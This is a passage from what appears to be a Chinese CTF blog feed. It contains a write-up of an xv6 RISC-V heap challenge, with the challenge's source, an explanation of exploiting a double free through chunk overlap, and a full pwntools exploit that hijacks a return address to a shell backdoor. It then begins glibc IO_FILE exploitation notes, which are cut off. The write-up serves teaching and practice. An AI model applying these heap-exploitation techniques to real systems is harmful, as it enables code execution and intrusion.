href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>在<code>free</code>函数中，会先遍历<code>free</code>链表，若途中遇到待释放的堆块地址处于链表中的两个<code>free</code>堆块之间的话，则会提前退出，否则等待链表被遍历完一轮之后退出（实际上该链表为一个单向循环链表）。然后检查该堆块是否有前&#x2F;后向相邻的<code>free</code>堆块，若有则进行前&#x2F;后向合并，若无则将其直接插入到<code>free</code>链表中。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>查看保护机制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/uheap$ checksec chal</span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] &#x27;/mnt/d/desktop/uheap/chal&#x27;</span><br><span class="line">    Arch:     riscv64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>只开启的<code>NX enabled</code>(<code>133nson</code>：“送分题”)<br>出题人比较友好，直接给出了题目源码<br>chal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *arr[<span class="number">4</span>];</span><br><span class="line"><span class="type">void</span> *record;</span><br><span class="line"><span class="type">int</span> chance = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         __\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  __  __/ /_  ___  ____ _____\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; / / / / __ \\/ _ \\/ __ `/ __ \\\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;/ /_/ / / / /  __/ /_/ / /_/ /\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\__,_/_/ /_/\\___/\\__,_/ .___/\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                     /_/\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. add\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. delete\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. ???\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">read(<span class="number">1</span>, &amp;buf[i], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(buf[i] == <span class="string">&#x27;\x0a&#x27;</span>)&#123;</span><br><span class="line">buf[i] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (size &lt; <span class="number">0</span> || size &gt; <span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">4</span>; idx++)</span><br><span class="line"><span class="keyword">if</span> (arr[idx] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (idx == <span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arr[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">readline(arr[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[idx]) &#123;</span><br><span class="line"><span class="built_in">free</span>(arr[idx]);</span><br><span class="line"><span class="keyword">if</span> (chance)</span><br><span class="line">record = arr[idx];</span><br><span class="line">arr[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> *argv[] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (chance) &#123;</span><br><span class="line"><span class="keyword">if</span> (record)</span><br><span class="line"><span class="built_in">free</span>(record);</span><br><span class="line">record = <span class="number">0</span>;</span><br><span class="line">chance = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">banner();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">switch</span> (choice) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">delete();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">gift();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目给出的<code>backdoor</code>，而且<code>gitf</code>函数则是直接送了一次<code>double free</code><br>但是我们不能直接<code>double free</code>，主要有两个原因：</p><ul><li>观察到<code>free</code>函数前面会有一个循环遍历</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">  <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>如果直接<code>double free</code>会直接在这里进入死循环</p><ul><li><code>ptr</code>指针在<code>heap</code>的头部前<code>8</code>个字节，直接<code>double free</code>并不能对起做任何修改</li></ul><p>所以可以选择叠堆后造成堆溢出才有机会修改<code>ptr</code>指针</p><p>因为这里的堆块合并条件非常简单，所以造堆叠也很简单，先<code>free</code>两个相邻的堆块让他们合并（下文称这两个堆块中低地址的堆块为<code>a</code>，高地址的为<code>b</code>），合并后表头<code>freep</code>变为刚刚释放的<code>a</code>，然后<code>double free</code>堆块<code>b</code>，这个时候因为表头是<code>a</code>，所以第一次循环就满足 <code>if(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</code> 的条件退出循环，这时又因为<code>b</code>与之前<code>a</code>不相邻（合并后堆块<code>a</code>的<code>size</code>已被修改为合并后的大小），所以不会触发合并，而是将<code>b</code>直接链入链表。现在只需要将<code>a</code>申请出来，就可以堆叠到<code>b</code>进行非法写入修改<code>free</code>链表上堆块<code>b</code>的<code>s.ptr</code>。因为之前合并的时候<code>freep</code>被赋值为了堆块<code>a</code>，而<code>malloc</code>遍历是从<code>freep-&gt;s.ptr</code>开始遍历的，为了简化利用模型，可以再<code>free</code>一个低于以上两个且不相邻的堆块来更新<code>freep</code>，将<code>freep-&gt;s.ptr</code>变成堆块<code>a</code>，然后下次<code>malloc</code>的时候就会从<code>a</code>开始遍历。这时申请出<code>size</code>为<code>a+b</code>堆块就可以把之前的<code>a</code>申请出来，利用堆叠写<code>b-&gt;s.ptr</code>为目标地址<code>addr</code>，再连续分配两次（先要把<code>b</code>给申请出来），<code>malloc</code>就会尝试将<code>addr</code>分配出去，这时如果<code>addr</code>合法（地址合法且<code>size</code>符合要求）就会返回<code>addr</code>，到这一步就完成了容易地址分配<br>至于分配到哪，因为程序是静态链接的，没<code>got</code>表可打，没动态库中的<code>hook</code>和<code>glibc</code>中的经典<code>io</code>可打，也没什么现成的函数指针可以利用。所以考虑分配到栈上劫持返回地址到后门，因为系统没有<code>ASLR</code>功能（其实出题人出到一半看到了一篇<code>xv6</code>实现<code>ASLR</code>功能的论文，但因为时间比较仓促所以没有把<code>ASLR</code>加上了，也算是变相降低了难度吧），可以通过调试找到固定的栈帧地址来劫持<code>add</code>函数的返回地址。最后就是因为<code>malloc</code>函数中要<code>size</code>满足要求才能将目标地址<code>addr</code>分配出去，所以这里可以考虑利用<code>add</code>函数的局部栈上变量<code>size</code>和<code>idx</code>来构造合法的<code>size</code>将<code>addr</code>分配出去，这里用的是<code>idx</code>（<code>idx</code>最后为<code>3</code>，可以通过 <code>malloc(0x20)</code> 分配）</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. ???\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gift()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x3fa4</span>))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p64(<span class="number">0x2da</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高版本glibc堆利用笔记</title>
      <link href="/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>该笔记目的是为了方便自己做题，所以每个打法写的非常简便，且部分内容为从各位师傅的文章中直接复制，没有记录更加深入的原理</p><h3 id="部分结构源码"><a href="#部分结构源码" class="headerlink" title="部分结构源码"></a>部分结构源码</h3><h4 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE  <span class="comment">// 可以看出如果使用旧的 _IO_FILE ,那我们经常说的IO就是  _IO_FILE_complete</span></span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="struct-IO-wide-data"><a href="#struct-IO-wide-data" class="headerlink" title="struct _IO_wide_data"></a>struct _IO_wide_data</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="IO-wfile-jumps"><a href="#IO-wfile-jumps" class="headerlink" title="_IO_wfile_jumps"></a>_IO_wfile_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span 